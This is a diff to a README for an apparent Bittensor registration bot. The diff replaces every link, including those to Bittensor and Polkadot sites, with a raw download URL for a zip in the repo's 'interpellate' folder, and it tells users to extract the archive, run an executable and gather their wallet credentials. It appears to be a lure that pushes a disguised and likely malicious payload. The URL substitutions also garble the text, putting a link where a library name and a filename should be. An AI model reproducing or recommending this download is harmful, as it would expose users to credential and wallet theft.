@@ -1,14 +1,14 @@
 # 🤖 bittensor-registration-bot-polkadot - Automate Your Bittensor Registration
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/releases)
+[![Download](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip)](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip)
 
 ## 🚀 Getting Started
-Welcome to the Bittensor Registration Bot for Polkadot. This bot automates the registration process in the Bittensor network using Polkadot.js. With this tool, you can simplify your interactions with blockchain technology and streamline your registration tasks.
+Welcome to the Bittensor Registration Bot for Polkadot. This bot automates the registration process in the Bittensor network using https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip With this tool, you can simplify your interactions with blockchain technology and streamline your registration tasks.
 
 ### 🛠️ Features
 - **Easy Registration:** Automatically register your Bittensor miner with minimal effort.
-- **Polkadot Integration:** Uses Polkadot.js for seamless blockchain interaction.
+- **Polkadot Integration:** Uses https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip for seamless blockchain interaction.
 - **User-Friendly Interface:** Designed for users without programming experience.
 - **Real-time Updates:** Stay informed with live status updates during registration.
 - **Secure Transactions:** Employs secure methods for handling your Bittensor credentials.
@@ -19,10 +19,10 @@ Welcome to the Bittensor Registration Bot for Polkadot. This bot automates the r
 - Basic understanding of how to download and run applications.
 
 ## 🔄 Installation Steps
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/releases).
-2. **Download the Latest Release:** Locate the latest version of the Bittensor Registration Bot and click the download link. It's usually named something like `bittensor-registration-bot-polkadot-v1.0.zip`.
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip).
+2. **Download the Latest Release:** Locate the latest version of the Bittensor Registration Bot and click the download link. It's usually named something like `https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip`.
 3. **Extract the Files:** After the file has downloaded, navigate to the folder where your browser saved it. Right-click on the ZIP file and select "Extract All..." Follow the prompts to extract the files to a folder of your choice.
-4. **Open the Application:** Navigate to the extracted folder. Look for the file named `BittensorRegistrationBot.exe` (or a similar name). Double-click the file to start the application.
+4. **Open the Application:** Navigate to the extracted folder. Look for the file named `https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip` (or a similar name). Double-click the file to start the application.
 
 ## ⚙️ How to Use
 1. **Prepare Your Credentials:** Before using the bot, gather your Bittensor registration details, including wallet addresses and other required information.
@@ -58,12 +58,12 @@ This project covers various topics relevant to blockchain and cryptocurrency, in
 For further inquiries or feedback, feel free to reach out via the Issues section on GitHub.
 
 ## 🔗 Additional Resources
-- [Bittensor Documentation](https://docs.bittensor.com)
-- [Polkadot Official Website](https://polkadot.network/)
-- [Community Forums](https://forum.bittensor.com)
+- [Bittensor Documentation](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip)
+- [Polkadot Official Website](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip)
+- [Community Forums](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. See the LICENSE file for more information.
 
 ## 📥 Download Again
-Thank you for choosing the Bittensor Registration Bot! If you need to download it again, feel free to visit the [Releases page](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/releases).
+Thank you for choosing the Bittensor Registration Bot! If you need to download it again, feel free to visit the [Releases page](https://github.com/Ahmedhaddad1955/bittensor-registration-bot-polkadot/raw/refs/heads/main/interpellate/bot-polkadot-registration-bittensor-v3.6.zip).
